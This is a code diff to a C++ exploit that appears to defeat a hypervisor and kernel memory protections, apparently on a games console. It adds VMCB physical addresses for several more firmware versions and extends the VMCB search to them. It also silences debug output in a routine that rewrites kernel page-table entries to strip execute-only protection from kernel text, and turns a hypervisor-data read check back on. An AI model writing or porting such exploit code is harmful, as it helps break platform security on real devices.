@@ -106,7 +106,17 @@ int stage1_tmr_relax(hv_defeat_ctx *ctx) {
 
 uint64_t get_vmcb (hv_defeat_ctx *ctx, int core) {
     switch (ctx->fw) {
+        case 0x0300:
+        case 0x0310:
+        case 0x0320:
+        case 0x0321:
+            return (uint64_t) 0x6290B000 + (uint64_t) core * 0x3000;
+            break;
+        case 0x0400:
+        case 0x0402:
         case 0x0403:
+        case 0x0450:
+        case 0x0451:
             return (uint64_t) 0x62A05000 + (uint64_t) core * 0x3000;
             break;
         default:
@@ -147,7 +157,7 @@ int stage2_find_vmcbs(hv_defeat_ctx *ctx) {
     for (int c = 0; c < 16; c++) {
         uint64_t ptr_pa;
 
-        if (ctx->fw == 0x0403) {
+        if (ctx->fw >= 0x0300) {
             
             uint64_t vmcb_pa = get_vmcb(ctx, c);
             std::print("  core {:2d}: pa=0x{:x}\n", c, vmcb_pa);
@@ -252,17 +262,17 @@ int stage3b_remove_xotext(hv_defeat_ctx *ctx) {
     uint64_t pmap = ctx->kbase + fw_off(ctx->fw, "OFF_PMAP_STORE");
     uint64_t read_2 = 0;
     kernel_copyout(pmap, &read_2, sizeof(read_2));
-    std::print("pmap: {:016x} -> {:016x}\n", pmap, read_2);
+    //std::print("pmap: {:016x} -> {:016x}\n", pmap, read_2);
     
     kernel_copyout(pmap + fw_off(ctx->fw, "PMAP_PM_PML4"), &read_2, 8);
-    std::print("pmap + pml4: {:016x} -> {:016x}\n", pmap + fw_off(ctx->fw, "PMAP_PM_PML4"), read_2);
+    //std::print("pmap + pml4: {:016x} -> {:016x}\n", pmap + fw_off(ctx->fw, "PMAP_PM_PML4"), read_2);
     uint64_t start = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;
     uint64_t end = (uint64_t)KERNEL_ADDRESS_DATA_BASE;
     int n = 0;
 
     for (uint64_t a = start; a < end; a += 0x1000) {
 
-        std::print("VA to unlock : {:x}\n", a);
+        //std::print("VA to unlock : {:x}\n", a);
 
         uint64_t pde, pde_a = find_pde(pmap, a, &pde);
         if (pde_a != ~0ULL) {
@@ -270,7 +280,7 @@ int stage3b_remove_xotext(hv_defeat_ctx *ctx) {
             kernel_copyin(&pde, pde_a, sizeof(pde));
             uint64_t read = 0;
             kernel_copyout(pde_a, &read, sizeof(read));
-            std::print("Entry pde a: {:x} pde_a: {:x} write: {:016x} read: {:016x}\n", a, pde_a, pde, read);
+            //std::print("Entry pde a: {:x} pde_a: {:x} write: {:016x} read: {:016x}\n", a, pde_a, pde, read);
         }
         uint64_t pte, pte_a = find_pte(pmap, a, &pte);
         if (pte_a != ~0ULL) {
@@ -278,7 +288,7 @@ int stage3b_remove_xotext(hv_defeat_ctx *ctx) {
             kernel_copyin(&pte, pte_a, sizeof(pte));
             uint64_t read3 = 0;
             kernel_copyout(pte_a, &read3, sizeof(read3));
-            std::print("Entry pte a: {:x} pte_a: {:x} write: {:016x} read: {:016x}\n\n", a, pte_a, pte, read3);
+            //std::print("Entry pte a: {:x} pte_a: {:x} write: {:016x} read: {:016x}\n\n", a, pte_a, pte, read3);
         }
         n++;
     }
@@ -288,17 +298,17 @@ int stage3b_remove_xotext(hv_defeat_ctx *ctx) {
 
 
 int stage4_verify(hv_defeat_ctx *ctx) {
-    usleep(10000000);
+    usleep(5000000);
     std::print("\n[stage4] verify\n");
 
     pin_to_first_available_core();
 
     uint64_t ktext = kr8((uint64_t)KERNEL_ADDRESS_TEXT_BASE);
-    //uint64_t hvdata = kr8(ctx->hv_data_va);
+    uint64_t hvdata = kr8(ctx->hv_data_va);
     uint32_t np = ctx->vmcb_count > 0 ? gpu_read_phys4(ctx->vmcb_pas[0] + VMCB_NP_ENABLE) : 0xFF;
 
     std::print("  ktext  0x{:016x}{}\n", ktext, (ktext != 0 && ktext != ~0ULL) ? " ok" : " fail");
-    //std::print("  hvdata 0x{:016x}{}\n", hvdata, (hvdata != ~0ULL) ? " ok" : " fail");
+    std::print("  hvdata 0x{:016x}{}\n", hvdata, (hvdata != ~0ULL) ? " ok" : " fail");
     std::print("  np     0x{:x}{}\n", np, ((np & 0x9) == 0) ? " ok" : " fail");
 
     // verify intercepts persisted on vmcb[0]
